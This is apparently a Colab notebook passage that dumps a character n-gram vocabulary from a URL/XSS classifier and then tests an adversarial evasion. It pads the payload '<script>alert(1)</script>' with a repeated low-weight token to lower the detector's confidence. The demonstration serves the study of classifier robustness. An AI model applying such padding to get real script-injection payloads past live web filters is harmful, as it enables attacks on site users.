              " '523': 23542,\n",
              " '237': 17608,\n",
              " '37;': 19857,\n",
              " '7;\"': 27797,\n",
              " ';\"<': 33080,\n",
              " '\"</': 2850,\n",
              " 'q': 74786,\n",
              " '1': 14970,\n",
              " '6': 25077,\n",
              " 'ts': 83646,\n",
              " '/q': 12286,\n",
              " 'qc': 75528,\n",
              " 'cv': 45551,\n",
              " 'vj': 87301,\n",
              " 'jn': 60654,\n",
              " 'ag': 40257,\n",
              " 'gy': 55021,\n",
              " 'y1': 92644,\n",
              " '16': 15681,\n",
              " '6k': 26390,\n",
              " 'kc': 62150,\n",
              " 'c.': 43764,\n",
              " 'cf': 44713,\n",
              " 'fm': 52248,\n",
              " 'm\\n': 65683,\n",
              " 'pts': 74474,\n",
              " 'ts/': 83663,\n",
              " 's/q': 79418,\n",
              " '/qc': 12306,\n",
              " 'qcv': 75571,\n",
              " 'cvj': 45584,\n",
              " 'vjn': 87336,\n",
              " 'jna': 60676,\n",
              " 'nag': 68931,\n",
              " 'agy': 40306,\n",
              " 'gy1': 55033,\n",
              " 'y16': 92654,\n",
              " '16k': 15725,\n",
              " '6kc': 26408,\n",
              " 'kc.': 62158,\n",
              " 'c.c': 43770,\n",
              " '.cf': 10218,\n",
              " 'cfm': 44750,\n",
              " 'fm\\n': 52249,\n",
              " ' ': 348,\n",
              " '4': 21211,\n",
              " '&': 4002,\n",
              " 'he': 56128,\n",
              " 'lp': 65113,\n",
              " 'p.': 72746,\n",
              " '?q': 35925,\n",
              " 'q=': 75342,\n",
              " '\"d': 2997,\n",
              " 'l ': 63335,\n",
              " ' q': 1649,\n",
              " 'q6': 75190,\n",
              " '65': 25580,\n",
              " '55': 23685,\n",
              " '53': 23581,\n",
              " '33': 19618,\n",
              " '32': 19563,\n",
              " '21': 17476,\n",
              " '14': 15569,\n",
              " '4&': 21281,\n",
              " '&r': 4322,\n",
              " 'em': 49975,\n",
              " 'm ': 65688,\n",
              " '/he': 11899,\n",
              " 'hel': 56164,\n",
              " 'elp': 49962,\n",
              " 'lp.': 65124,\n",
              " 'p.p': 72772,\n",
              " 'p?q': 73351,\n",
              " '?q=': 35926,\n",
              " 'q=\"': 75344,\n",
              " '=\"d': 34034,\n",
              " '\"de': 3000,\n",
              " 'del': 47086,\n",
              " 'el ': 49917,\n",
              " 'l q': 63376,\n",
              " ' q6': 1658,\n",
              " 'q65': 75198,\n",
              " '655': 25599,\n",
              " '553': 23701,\n",
              " '533': 23597,\n",
              " '332': 19634,\n",
              " '321': 19576,\n",
              " '214': 17493,\n",
              " '14&': 15574,\n",
              " '4&r': 21291,\n",
              " '&re': 4326,\n",
              " 'rem': 77882,\n",
              " 'em ': 49977,\n",
              " ':': 32669,\n",
              " '8': 28882,\n",
              " '0': 12808,\n",
              " 'z': 94408,\n",
              " 'tp': 83490,\n",
              " 'h/': 55353,\n",
              " '?p': 35902,\n",
              " 'ge': 54011,\n",
              " '=h': 34734,\n",
              " 'ht': 56876,\n",
              " 'tt': 83708,\n",
              " 'p:': 73244,\n",
              " ':/': 32759,\n",
              " '//': 10832,\n",
              " '/1': 10954,\n",
              " '19': 15855,\n",
              " '2.': 17361,\n",
              " '.1': 10019,\n",
              " '68': 25747,\n",
              " '8.': 29065,\n",
              " '.2': 10046,\n",
              " '20': 17418,\n",
              " '02': 13274,\n",
              " '11': 15397,\n",
              " '18': 15799,\n",
              " '8:': 29650,\n",
              " ':8': 32821,\n",
              " '80': 29118,\n",
              " '08': 13599,\n",
              " '0/': 13114,\n",
              " '/2': 11004,\n",
              " '2a': 18105,\n",
              " 'ib': 58069,\n",
              " 'bf': 42466,\n",
              " 'ac': 40035,\n",
              " 'cz': 45758,\n",
              " 'zm': 95615,\n",
              " 'ma': 66576,\n",
              " 'c8': 44183,\n",
              " '8?': 29688,\n",
              " '?\\n': 35513,\n",
              " 'ptp': 74471,\n",
              " 'tpa': 83516,\n",
              " 'th/': 83088,\n",
              " 'h/i': 55377,\n",
              " 'p?p': 73350,\n",
              " '?pa': 35908,\n",
              " 'pag': 73476,\n",
              " 'age': 40286,\n",
              " 'ge=': 54037,\n",
              " 'e=h': 49145,\n",
              " '=ht': 34746,\n",
              " 'htt': 56920,\n",
              " 'ttp': 83749,\n",
              " 'tp:': 83512,\n",
              " 'p:/': 73246,\n",
              " '://': 32765,\n",
              " '//1': 10850,\n",
              " '/19': 10972,\n",
              " '192': 15873,\n",
              " '92.': 31122,\n",
              " '2.1': 17364,\n",
              " '.16': 10034,\n",
              " '168': 15705,\n",
              " '68.': 25756,\n",
              " '8.2': 29070,\n",
              " '.20': 10052,\n",
              " '202': 17435,\n",
              " '02.': 13284,\n",
              " '.11': 10029,\n",
              " '118': 15419,\n",
              " '18:': 15824,\n",
              " '8:8': 29653,\n",
              " ':80': 32822,\n",
              " '808': 29139,\n",
              " '080': 13611,\n",
              " '80/': 29130,\n",
              " '0/2': 13120,\n",
              " '/2a': 11021,\n",
              " '2ai': 18132,\n",
              " 'aib': 40385,\n",
              " 'ibf': 58098,\n",
              " 'bfa': 42487,\n",
              " 'fac': 51669,\n",
              " 'acz': 40087,\n",
              " 'czm': 45793,\n",
              " 'zma': 95636,\n",
              " 'mac': 66608,\n",
              " 'ac8': 40055,\n",
              " 'c8?': 44199,\n",
              " '8?\\n': 29689,\n",
              " '\\\\': 36509,\n",
              " '/m': 12101,\n",
              " 'n.': 68221,\n",
              " 'tu': 83761,\n",
              " 'uf': 85030,\n",
              " 'ff': 51897,\n",
              " 'f=': 51504,\n",
              " '\"&': 2577,\n",
              " '&d': 4185,\n",
              " 'l\\\\': 64238,\n",
              " '\\\\x': 36814,\n",
              " 'x0': 90443,\n",
              " '0c': 13958,\n",
              " 'cq': 45281,\n",
              " 'q9': 75302,\n",
              " '99': 31496,\n",
              " '27': 17811,\n",
              " '79': 27738,\n",
              " '93': 31168,\n",
              " '39': 19944,\n",
              " '96': 31332,\n",
              " '6&': 25147,\n",
              " 'm\\\\': 66514,\n",
              " 'c\\n': 43532,\n",
              " '/ma': 12124,\n",
              " 'mai': 66614,\n",
              " 'ain': 40397,\n",
              " 'in.': 58739,\n",
              " 'n.p': 68240,\n",
              " '?st': 35965,\n",
              " 'stu': 81168,\n",
              " 'tuf': 83788,\n",
              " 'uff': 85057,\n",
              " 'ff=': 51924,\n",
              " 'f=\"': 51507,\n",
              " '=\"&': 34003,\n",
              " '\"&d': 2583,\n",
              " '&de': 4191,\n",
              " 'el\\\\': 49943,\n",
              " 'l\\\\x': 64247,\n",
              " '\\\\x0': 36818,\n",
              " 'x0c': 90463,\n",
              " '0cq': 13995,\n",
              " 'cq9': 45301,\n",
              " 'q99': 75315,\n",
              " '992': 31512,\n",
              " '927': 31131,\n",
              " '279': 17834,\n",
              " '793': 27755,\n",
              " '939': 31191,\n",
              " '396': 19963,\n",
              " '96&': 31336,\n",
              " '6&r': 25158,\n",
              " 'em\\\\': 50004,\n",
              " 'm\\\\x': 66522,\n",
              " '0c\\n': 13959,\n",
              " 'ja': 60022,\n",
              " 'va': 86839,\n",
              " 'as': 40902,\n",
              " '/u': 12470,\n",
              " 'us': 85679,\n",
              " 'sr': 80991,\n",
              " 'r.': 76941,\n",
              " '.e': 10250,\n",
              " 'xe': 91218,\n",
              " 'e\\n': 48184,\n",
              " '/ja': 11985,\n",
              " 'jav': 60068,\n",
              " 'ava': 41103,\n",
              " 'vas': 86886,\n",
              " 'asc': 40942,\n",
              " 'pt/': 74433,\n",
              " 't/u': 81939,\n",
              " '/us': 12507,\n",
              " 'usr': 85732,\n",
              " 'sr.': 80998,\n",
              " 'r.e': 76949,\n",
              " '.ex': 10263,\n",
              " 'exe': 50644,\n",
              " 'xe\\n': 91219,\n",
              " '/t': 12423,\n",
              " 'tx': 83912,\n",
              " 'xs': 91892,\n",
              " 'ss': 81041,\n",
              " 'sh': 80458,\n",
              " 'h2': 55478,\n",
              " '2_': 18061,\n",
              " '_2': 37357,\n",
              " '12': 15452,\n",
              " '2/': 17397,\n",
              " '/tt': 12463,\n",
              " 'ttx': 83757,\n",
              " 'txs': 83952,\n",
              " 'xss': 91935,\n",
              " 'ssh': 81086,\n",
              " 'sh2': 80474,\n",
              " 'h2_': 55493,\n",
              " '2_2': 18068,\n",
              " '_21': 37363,\n",
              " '212': 17491,\n",
              " '12/': 15465,\n",
              " '2/\\n': 17398,\n",
              " 'qu': 76371,\n",
              " 'ua': 84776,\n",
              " 'yn': 93757,\n",
              " 'nk': 69441,\n",
              " 'ka': 62051,\n",
              " 'a.': 39228,\n",
              " '.h': 10288,\n",
              " 'tm': 83332,\n",
              " 'm?': 66478,\n",
              " '>c': 35370,\n",
              " 'os': 72103,\n",
              " 's_': 80037,\n",
              " 'si': 80518,\n",
              " 'it': 59057,\n",
              " 'e_': 49266,\n",
              " 'ng': 69228,\n",
              " 'g.': 53185,\n",
              " '.n': 10348,\n",
              " 'sl': 80673,\n",
              " 'l<': 64139,\n",
              " '/qu': 12324,\n",
              " 'qua': 76393,\n",
              " 'uag': 84802,\n",
              " 'gyn': 55058,\n",
              " 'ynk': 93789,\n",
              " 'nka': 69472,\n",
              " 'ka.': 62059,\n",
              " 'a.h': 39237,\n",
              " '.ht': 10297,\n",
              " 'htm': 56913,\n",
              " 'tm?': 83353,\n",
              " 'm?<': 66484,\n",
              " 't>c': 82551,\n",
              " '>cr': 35373,\n",
              " 'cro': 45371,\n",
              " 'ros': 78432,\n",
              " 'oss': 72150,\n",
              " 'ss_': 81077,\n",
              " 's_s': 80072,\n",
              " '_si': 38472,\n",
              " 'sit': 80561,\n",
              " 'ite': 59097,\n",
              " 'te_': 82947,\n",
              " 'e_s': 49302,\n",
              " '_sc': 38466,\n",
              " 'tin': 83173,\n",
              " 'ing': 58765,\n",
              " 'ng.': 69242,\n",
              " 'g.n': 53202,\n",
              " '.na': 10349,\n",
              " 'nas': 68943,\n",
              " 'asl': 40951,\n",
              " 'sl<': 80696,\n",
              " 'l</': 64141,\n",
              " \"'\": 4414,\n",
              " '%': 3745,\n",
              " '<>': 33759,\n",
              " '>\"': 35091,\n",
              " '\"\\'': 2596,\n",
              " \"'%\": 4494,\n",
              " '%;': 3876,\n",
              " ';)': 33150,\n",
              " ')(': 5815,\n",
              " '(&': 5138,\n",
              " '&+': 4074,\n",
              " '+\\n': 7202,\n",
              " '<>\"': 33760,\n",
              " '>\"\\'': 35095,\n",
              " '\"\\'%': 2600,\n",
              " \"'%;\": 4500,\n",
              " '%;)': 3877,\n",
              " ';)(': 33154,\n",
              " ')(&': 5818,\n",
              " '(&+': 5140,\n",
              " '&+\\n': 4075,\n",
              " '[': 36168,\n",
              " ']': 36846,\n",
              " '/p': 12239,\n",
              " 'po': 74154,\n",
              " 'ol': 71687,\n",
              " 'll': 64885,\n",
              " 'ls': 65259,\n",
              " 's.': 79342,\n",
              " '.s': 10411,\n",
              " '?g': 35801,\n",
              " 'gl': 54370,\n",
              " 'ob': 71160,\n",
              " 'ba': 42204,\n",
              " 's[': 79981,\n",
              " '[p': 36434,\n",
              " 'h]': 55883,\n",
              " '][': 37014,\n",
              " '[c': 36330,\n",
              " 'cl': 45030,\n",
              " 's]': 80026,\n",
              " ']=': 36967,\n",
              " 'mo': 67318,\n",
              " 'ly': 65566,\n",
              " 'yx': 94240,\n",
              " 'xl': 91558,\n",
              " 'lw': 65472,\n",
              " 'wq': 89650,\n",
              " 'qy': 76552,\n",
              " 'fj': 52107,\n",
              " 'np': 69705,\n",
              " '??': 35641,\n",
              " 's/p': 79417,\n",
              " '/po': 12274,\n",
              " 'pol': 74186,\n",
              " 'oll': 71725,\n",
              " 'lls': 64941,\n",
              " 'ls.': 65270,\n",
              " 's.s': 79365,\n",
              " '.sc': 10413,\n",
              " 'cr.': 45340,\n",
              " 'r.p': 76960,\n",
              " 'p?g': 73341,\n",
              " '?gl': 35808,\n",
              " 'glo': 54405,\n",
              " 'lob': 65087,\n",
              " 'oba': 71189,\n",
              " 'bal': 42242,\n",
              " 'als': 40556,\n",
              " 'ls[': 65286,\n",
              " 's[p': 80004,\n",
              " '[pt': 36445,\n",
              " 'pth': 74463,\n",
              " 'th]': 83107,\n",
              " 'h][': 55888,\n",
              " '][c': 37026,\n",
              " '[cl': 36340,\n",
              " 'cla': 45054,\n",
              " 'las': 64357,\n",
              " 'ass': 40958,\n",
              " 'sse': 81083,\n",
              " 'ses': 80346,\n",
              " 'es]': 50357,\n",
              " 's]=': 80031,\n",
              " ']=h': 36983,\n",
              " '0/m': 13139,\n",
              " '/mo': 12138,\n",
              " 'moc': 67344,\n",
              " 'ocl': 71254,\n",
              " 'cly': 45078,\n",
              " 'lyx': 65617,\n",
              " 'yxl': 94273,\n",
              " 'xlw': 91602,\n",
              " 'lwq': 65509,\n",
              " 'wqy': 89697,\n",
              " 'qyf': 76574,\n",
              " 'yfj': 93410,\n",
              " 'fjn': 52140,\n",
              " 'jnp': 60691,\n",
              " 'np?': 69724,\n",
              " 'p??': 73331,\n",
              " '??\\n': 35642,\n",
              " '/v': 12515,\n",
              " 'vh': 87206,\n",
              " '?a': 35692,\n",
              " 'n=': 68742,\n",
              " '=l': 34789,\n",
              " 'og': 71426,\n",
              " 'go': 54517,\n",
              " 'ou': 72216,\n",
              " 'ut': 85741,\n",
              " 't&': 81635,\n",
              " '&t': 4357,\n",
              " 'im': 58670,\n",
              " '=1': 34280,\n",
              " '13': 15511,\n",
              " '31': 19505,\n",
              " '91': 31061,\n",
              " '89': 29595,\n",
              " '95': 31278,\n",
              " '57': 23787,\n",
              " '7\\n': 27038,\n",
              " 's/v': 79423,\n",
              " '/vh': 12542,\n",
              " 'vho': 87241,\n",
              " 'hos': 56660,\n",
              " 'ost': 72151,\n",
              " 'st.': 81125,\n",
              " 'p?a': 73335,\n",
              " '?ac': 35699,\n",
              " 'act': 40081,\n",
              " 'cti': 45486,\n",
              " 'on=': 71836,\n",
              " 'n=l': 68781,\n",
              " '=lo': 34796,\n",
              " 'log': 65092,\n",
              " 'ogo': 71472,\n",
              " 'gou': 54566,\n",
              " 'out': 72260,\n",
              " 'ut&': 85747,\n",
              " 't&t': 81658,\n",
              " '&ti': 4364,\n",
              " 'tim': 83172,\n",
              " 'ime': 58702,\n",
              " 'me=': 66812,\n",
              " 'e=1': 49118,\n",
              " '=13': 34297,\n",
              " '133': 15528,\n",
              " '331': 19633,\n",
              " '319': 19529,\n",
              " '191': 15872,\n",
              " '918': 31081,\n",
              " '189': 15823,\n",
              " '895': 29613,\n",
              " '957': 31297,\n",
              " '57\\n': 23789,\n",
              " 'uc': 84878,\n",
              " 'c3': 43966,\n",
              " '3w': 21047,\n",
              " 'w3': 88474,\n",
              " '3b': 20178,\n",
              " 'bd': 42364,\n",
              " 'di': 47249,\n",
              " 'i.': 57431,\n",
              " '.k': 10321,\n",
              " 'ks': 62923,\n",
              " 'px': 74631,\n",
              " 'x?': 90924,\n",
              " '<m': 33856,\n",
              " 'et': 50386,\n",
              " 'ta': 82704,\n",
              " 'a ': 38959,\n",
              " ' h': 1328,\n",
              " 'p-': 72707,\n",
              " '-e': 8997,\n",
              " 'eq': 50203,\n",
              " 'ui': 85174,\n",
              " 'iv': 59168,\n",
              " 'v=': 86742,\n",
              " '=s': 34888,\n",
              " 't-': 81820,\n",
              " '-c': 8914,\n",
              " 'e ': 48190,\n",
              " ' c': 1134,\n",
              " 'lt': 65318,\n",
              " '=9': 34447,\n",
              " '94': 31222,\n",
              " '40': 21473,\n",
              " '0\"': 12869,\n",
              " '\">': 2873,\n",
              " '/uc': 12491,\n",
              " 'uc3': 84890,\n",
              " 'c3w': 44007,\n",
              " '3w3': 21054,\n",
              " 'w3b': 88492,\n",
              " '3bd': 20205,\n",
              " 'bdi': 42396,\n",
              " 'di.': 47259,\n",
              " 'i.k': 57445,\n",
              " '.ks': 10325,\n",
              " 'ksp': 62966,\n",
              " 'spx': 80937,\n",
              " 'px?': 74652,\n",
              " 'x?<': 90928,\n",
              " '?<m': 35621,\n",
              " '<me': 33858,\n",
              " 'met': 66839,\n",
              " 'eta': 50423,\n",
              " 'ta ': 82706,\n",
              " 'a h': 38988,\n",
              " ' ht': 1356,\n",
              " 'tp-': 83499,\n",
              " 'p-e': 72724,\n",
              " '-eq': 9029,\n",
              " 'equ': 50248,\n",
              " 'qui': 76401,\n",
              " 'uiv': 85218,\n",
              " 'iv=': 59191,\n",
              " 'v=s': 86762,\n",
              " '=se': 34898,\n",
              " 'set': 80347,\n",
              " 'et-': 50400,\n",
              " 't-c': 81836,\n",
              " '-co': 8944,\n",
              " 'ie ': 58242,\n",
              " 'e c': 48226,\n",
              " ' co': 1163,\n",
              " 'con': 45218,\n",
              " 'ont': 71862,\n",
              " 'nte': 69945,\n",
              " 'ten': 82961,\n",
              " 'nt=': 69934,\n",
              " 't=\"': 82464,\n",
              " 'stx': 81171,\n",
              " 'txl': 83945,\n",
              " 'xll': 91591,\n",
              " 'llt': 64942,\n",
              " 'lt=': 65342,\n",
              " 't=9': 82483,\n",
              " '=99': 34459,\n",
              " '994': 31514,\n",
              " '940': 31235,\n",
              " '40\"': 21476,\n",
              " '0\">': 12874,\n",
              " '\">\\n': 2875,\n",
              " '/f': 11784,\n",
              " 'fc': 51743,\n",
              " 'c9': 44226,\n",
              " '9t': 32403,\n",
              " 't5': 82168,\n",
              " '54': 23635,\n",
              " '4l': 22562,\n",
              " 'l7': 63990,\n",
              " '7.': 27203,\n",
              " 'tg': 83026,\n",
              " 'gg': 54121,\n",
              " 'ga': 53819,\n",
              " 'ad': 40089,\n",
              " '=2': 34315,\n",
              " '00': 13152,\n",
              " '0;': 13726,\n",
              " '/fc': 11806,\n",
              " 'fc9': 51762,\n",
              " 'c9t': 44261,\n",
              " '9t5': 32410,\n",
              " 't54': 82177,\n",
              " ...}"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 33
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "W89J5d-HuCm3",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# First, we create a token vocabulary dictionary so that\n",
        "# we can access tokens by index.\n",
        "vocab = dict([(v,k) for k,v in vec.vocabulary_.items()])"
      ],
      "execution_count": 34,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "FR6HJvn-uCm_",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "term_idx = np.argpartition(term_influence, 1)[0][0]"
      ],
      "execution_count": 35,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cneESaixuCnM",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "febd2565-1590-4590-b249-2f92a23d5c4b"
      },
      "source": [
        "print(vocab[term_idx])"
      ],
      "execution_count": 36,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "t/s\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "TiCgr1ZVuCnX",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "payload = \"<script>alert(1)</script>\""
      ],
      "execution_count": 37,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vQ5YM1VNuCnn",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "53626a68-3cbe-4895-99d1-223455c0bb13"
      },
      "source": [
        "p.predict([payload])[0]"
      ],
      "execution_count": 38,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 38
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Pomc4x4zuCnx",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "ecf21983-0cb3-4603-b6a5-3e5f6f6fdcdc"
      },
      "source": [
        "p.predict_proba([payload])[0]"
      ],
      "execution_count": 39,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([2.66398015e-11, 1.00000000e+00])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 39
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LQFxc4TwuCn8",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "82aecc22-9ed6-4a60-cda0-0a2f0a8c15db"
      },
      "source": [
        "p.predict_proba([payload + '/' + vocab[term_idx]])[0]"
      ],
      "execution_count": 40,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([7.87289400e-09, 9.99999992e-01])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 40
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "75lLa8tvuCoH",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# Find the multiplier value at which the classifier will start making errors\n",
        "multiplier = 100"
      ],
      "execution_count": 41,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-JpSpuiiuCoW",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "fee7f5e2-2baa-4b0a-fad4-01d9dc7c6177"
      },
      "source": [
        "p.predict_proba([payload + '/' + vocab[term_idx]*multiplier])[0]"
      ],
      "execution_count": 42,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([0.2679046, 0.7320954])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 42
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "PLFcloTYuCop",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "c2a1827d-a01c-4bf4-892c-db222ba5c0c3"
      },
      "source": [
        "p.predict([payload + '/' + vocab[term_idx]*multiplier])[0]"
      ],
      "execution_count": 43,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3aJtjAOvuCoy",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 54
        },
        "outputId": "f2f7e75a-22cd-4e04-a0ce-e1c0164a2cf3"
      },
      "source": [
        "print(payload + '/' + vocab[term_idx]*multiplier)"
      ],
      "execution_count": 44,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<script>alert(1)</script>/t/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/s\n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}